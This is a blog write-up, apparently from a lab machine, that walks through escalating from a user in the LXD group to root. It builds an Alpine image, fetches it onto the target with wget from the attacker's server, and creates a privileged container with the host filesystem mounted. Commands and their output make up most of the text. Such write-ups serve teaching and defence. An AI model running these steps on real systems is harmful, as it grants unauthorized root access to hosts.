---
title: LXD Privilege Escalation
author: 4m0r
date: 2020-08-05 17:00:00 +0530
excerpt: A writeup on how I escalated my privileges to root, through LXD group membership.
thumbnail: /assets/img/posts/lxd/info.jpg
categories: [Tutorial]
tags: [lxd, lxc, Privilege Escalation, container]
---

![Info](/assets/img/posts/lxd/info.jpg)

# Scenario
This time around, I gained *user* privileges on a machine and started enumerating to escalate my privileges. Upon 
checking the ID and group memberships of the current user, I identified that the user is part of the LXD group. 
```shell 
ash@tabby:/var/www/html/files$ id 
id 
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

# LXD
LXD[^f1] is a system container manager that is built on top of *Linux Containers* (LXC). Their goal is to provide an 
experience similar to a virtual machine but through containerization rather than hardware virtualization. They support
container images of major Linux distribution systems.

# Vulnerability
The vulnerability of the application lies in how it handles **access control**. Access control for LXD is based on
*group membership*. The official documentation[^f2] says that any user added to **LXD group** will have **full control** 
over LXD. However, it does not make an effort to match the permissions of the calling user to the function it has asked 
to perform. As an example, if a low privileged user were to bridge an existing socket on the host to a new socket on the
container, LXD makes the connection with the credentials of the LXD service's root and therefore, any and all subsequent 
messages get received on the host with root credentials. 
> **If you are looking for a privilege escalation vector through hijacking UNIX sockets,** ***Shenanigans Labs*** **has 
> a wirteup.[^f3].**

# Exploitation
The privilege escalation attack vector leveraging the vulnerability was first reported on LXD's GitHub as an issue[^f4] 
and exploit methods have been developed ever since. Reboare[^f5] has one such amazing write up, where LXD's code 
execution as root on the host was leveraged to escalate privileges. The exploitation is quite simple and it involves
just the following steps.
1. Create an LXC container
2. Assign it security privileges
3. Mount the entire (target) disk inside the container
4. Drop a shell inside the container and access the target as root

# Privilege Escalation 
For an image to create a new container on the target, an existing one can be used. For external choices however, the 
most popular one is the **alpine image**, owning to its small size (approx. 5 MB). A script to create an Alpine image
for use with LXD was developed by *saghul*[^f6], with a caveat that the image has to be built with root permissions
(sudo user). 
### Step 1- Build the alpine image
The [git repository](https://github.com/saghul/lxd-alpine-builder.git) was first cloned onto the attacking host. 
Navigating into the *lxd-alpine-builder*, the image was built by executing the shell script, **built-alpine**  as the 
**root user**. The process is as shown on the section below.
```shell 
[manjaro LXD]# git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Unpacking objects: 100% (27/27), 15.98 KiB | 287.00 KiB/s, done.

[manjaro LXD]# cd lxd-alpine-builder

[manjaro lxd-alpine-builder]# ./build-alpine  
which: no apk in (/home/whit3d3vil/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/var/li
b/snapd/snap/bin:/opt/oracle/instantclient_19_6:/home/whit3d3vil/TargetRecon:/usr/sbin:/usr/bin:/sbin:/bin) 
Determining the latest release... v3.12 
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64 
Downloading alpine-mirrors-3.5.10-r0.apk 
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' 
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1' 
Downloading alpine-keys-2.2-r0.apk 
---SNIP---
(18/19) Installing alpine-keys (2.2-r0) 
(19/19) Installing alpine-base (3.12.0-r0) 
Executing busybox-1.31.1-r19.trigger 
OK: 8 MiB in 19 packages 

[manjaro lxd-alpine-builder]# ls -l
total 3168 
-rw-r--r-- 1 _4m0r _4m0r     768 Aug  3 20:27 README.md 
-rw-r--r-- 1 _4m0r _4m0r   26530 Aug  3 20:27 LICENSE 
-rwxr-xr-x 1 _4m0r _4m0r    7498 Aug  3 20:27 build-alpine 
-rw-r--r-- 1 root  root  3202094 Aug  3 20:36 alpine-v3.12-x86_64-20200803_2036.tar.gz
```
The script had built the image as an archived file (tar.gz extension), named 
**alpine-v3.12-x86_64-20200803_2036.tar.gz**.

### Step 2- Transfer the image to the target
The next step involved transferring the new alpine image, built in the previous step, to the target. In my case I, 
initiated a *Python web server* on my machine and downloaded the image using **wget** on the target.
```shell 
ash@tabby:~$ wget http://10.10.14.50:8080/alpine-v3.12-x86_64-20200803_2036.tar.gz 
<14.50:8080/alpine-v3.12-x86_64-20200803_2036.tar.gz 
--2020-08-03 15:24:18--  http://10.10.14.50:8080/alpine-v3.12-x86_64-20200803_2036.tar.gz 
Connecting to 10.10.14.50:8080... connected. 
HTTP request sent, awaiting response... 200 OK 
Length: 3202094 (3.1M) [application/gzip] 
Saving to: ‘alpine-v3.12-x86_64-20200803_2036.tar.gz’ 
 
alpine-v3.12-x86_64 100%[===================>]   3.05M   582KB/s    in 8.0s 
```

### Step 3- Importing the image
The image was imported into the target's LXD as a new image. The command to perform this was 
```lxc image import ./alpine-v3.12-x86_64-20200803_2036.tar.gz --alias newimage```. This new image can be listed (for
verification) using the ```lxc image list``` command. The process is as shown on the section given below.
```shell 
ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200803_2036.tar.gz --alias newimage 
<-v3.12-x86_64-20200803_2036.tar.gz --alias newimage 
ash@tabby:~$ lxc image list 
lxc image list 
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ 
|  ALIAS   | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE         | 
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ 
| newimage | 0a6777442dca | no     | alpine v3.12 (20200803_20:36) | x86_64       | CONTAINER | 3.05MB | Aug 3, 2020 at 3:27pm (UTC) | 
+----------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ 
```

### Step 4- Creating a privileged container to mount the target
With this new image, a new container was created with *lxc init* and the security privileges were assigned as
```lxc init newimage ignite -c security.privileged=true ```. The container was then configured to mount the entire 
target onto **/mnt/root** as ```lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true```.
The process is as shown on the section given below.
```shell
ash@tabby:~$ lxc init newimage ignite -c security.privileged=true 
lxc init newimage ignite -c security.privileged=true 
Creating ignite 
ash@tabby:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true 
<ydevice disk source=/ path=/mnt/root recursive=true 
Device mydevice added to ignite 
```

### Step 5- Dropping the shell
The created container was then started as ```lxc start ignite```, following which the session was dropped onto the 
container as a **root** with *lxc exec* as ```lxc exec ignite /bin/sh```. This would result in a root shell within
the container as shown on the section given below.
```shell 
ash@tabby:~$ lxc start ignite 
lxc start ignite 
ash@tabby:~$ lxc exec ignite /bin/sh 
lxc exec ignite /bin/sh 
~ # id       
id 
uid=0(root) gid=0(root)
```

# Post Root
Now that a root shell was gained, the entire target can, now, be enumerated by navigating to */mnt/root*. If you were to 
check the IP information through the shell, you could find that the root shell gained was within the context of the 
LXD container.
```shell 
/mnt/root/root # ip a       
ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 
    inet 127.0.0.1/8 scope host lo 
       valid_lft forever preferred_lft forever 
    inet6 ::1/128 scope host  
       valid_lft forever preferred_lft forever 
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP qlen 1000 
    link/ether 00:16:3e:26:3c:36 brd ff:ff:ff:ff:ff:ff 
    inet 10.125.107.205/24 brd 10.125.107.255 scope global eth0 
       valid_lft forever preferred_lft forever 
    inet6 fd42:7448:c0ad:d9ec:216:3eff:fe26:3c36/64 scope global dynamic  
       valid_lft 3480sec preferred_lft 3480sec 
    inet6 fe80::216:3eff:fe26:3c36/64 scope link  
       valid_lft forever preferred_lft forever 
```

# Resources
[^f1]:[Linux Containers](https://linuxcontainers.org/lxd/)
[^f2]:[LXD Documentation CLI --> Access Control](https://linuxcontainers.org/lxd/getting-started-cli/)
[^f3]:[Linux Privilege Escalation via LXD & Hijacked UNIX Socket Credentials](https://shenaniganslabs.io/2019/05/21/LXD-LPE.html)
[^f4]:[User can use lxc hooks for privilege escalation on lxd host](https://github.com/lxc/lxd/issues/2003)
[^f5]:[Privilege Escalation via LXD](https://reboare.github.io/lxd/lxd-escape.html)
[^f6]:[LXD Alpine Image Builder](https://github.com/saghul/lxd-alpine-builder)